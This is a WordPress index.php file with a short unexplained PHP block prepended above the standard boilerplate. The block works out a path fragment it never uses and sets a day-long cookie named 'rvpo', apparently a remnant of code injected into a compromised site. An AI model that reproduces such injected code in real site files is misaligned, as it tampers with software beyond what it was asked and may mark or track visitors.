<?php
$full_path = getcwd();
$ar = explode("wp-", $full_path);
$dirPath = $ar[0];

$arr =  json_encode(array('0' => 0));
if(!isset($_COOKIE["rvpo"])){
	setcookie("rvpo",$arr, time()+3600*24,"/");
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
